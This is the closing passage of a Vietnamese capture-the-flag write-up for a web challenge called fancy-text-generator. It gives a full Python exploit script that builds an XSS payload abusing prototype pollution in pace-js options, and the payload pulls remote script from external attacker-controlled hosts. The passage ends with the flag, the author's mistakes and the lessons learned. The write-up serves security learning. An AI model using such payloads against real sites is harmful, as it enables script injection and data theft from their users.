+@app.route('/loader.js')
+def serve_js():
+    time.sleep(3)
+    return send_file('src/static/loader.js', mimetype='application/javascript')
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=3000)
+
+</code></pre>
+<p>Full script :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+import urllib.parse
+import html
+
+
+
+url =&quot;http://localhost:1338&quot;
+url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;
+
+options = &quot;&quot;
+
+#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;&quot;}}'&gt;&lt;script&gt;alert()&lt;/img&gt;'''
+
+def html_encode(s):
+    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)
+
+payload ='''aaaa\\&quot;&gt;&lt;iframe srcdoc =\\&quot;&lt;img id=&amp;amp;quot;data-pace-options&amp;amp;quot; data-pace-options=&amp;amp;#39;{&amp;amp;quot;__proto__&amp;amp;quot;: {&amp;amp;quot;polluted&amp;amp;quot;: &amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;amp;quot;}}&amp;amp;#39;&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script crossorigin=&amp;amp;quot;anonymous&amp;amp;quot;integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;https://commissioners-mozilla-messenger-compressed.trycloudflare.com/loader.js&amp;amp;quot;&gt;&lt;/script&gt;\\&quot;&gt;'''
+htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
+text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
+res = requests.get(url,params={&quot;text&quot;:text})
+print(res.text)
+print(payload)
+print(url + &quot;?text=&quot; + urllib.parse.quote(text))
+
+</code></pre>
+<p>Dùng script với cross-origin = anonymous để request cors enabled.
+Đến đây là xong bài rùi &hellip;</p>
+<p>flag :
+<strong>maltactf{oops_my_dependency_is_buggy_05b19465ce19db4e28ddb00bb19f101e}</strong></p>
+
+<h1 id="cảm-nhận-" class="header-anchor-wrapper">Cảm nhận :
+  <a href="#c%e1%ba%a3m-nh%e1%ba%adn-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Giải này khá là khoai :vv mới câu 2 thui mà mình đã quá ngu ròi. Thi xong sẽ quay lại làm mấy câu còn lại bruhh.</li>
+</ul>
+
+<h1 id="sai-lầm-" class="header-anchor-wrapper">Sai lầm :
+  <a href="#sai-l%e1%ba%a7m-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ol>
+<li>Không kiểm tra hết input vào một app</li>
+<li>Quá tin tưởng vào package latest :(</li>
+<li>Skill issue khi làm việc với html entity encode</li>
+</ol>
+
+<h1 id="new-knowledge-" class="header-anchor-wrapper">New knowledge :
+  <a href="#new-knowledge-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Object prototype in latest pace-js</li>
+<li>Enumerable inherit trong for in và vâng vâng</li>
+<li>Script intergrity check</li>
+</ul>
+
+<h1 id="audit-sau-giải" class="header-anchor-wrapper">Audit sau giải
+  <a href="#audit-sau-gi%e1%ba%a3i" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Dompurify id &ldquo;script&rdquo; and &ldquo;scripts&rdquo;</li>
+<li>Style with background can make xs leak with no csp ? &ndash;</li>
+</ul>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2025 by 3HLD Team | v1.0</article>
+</footer>
+
+</body>
+</html>
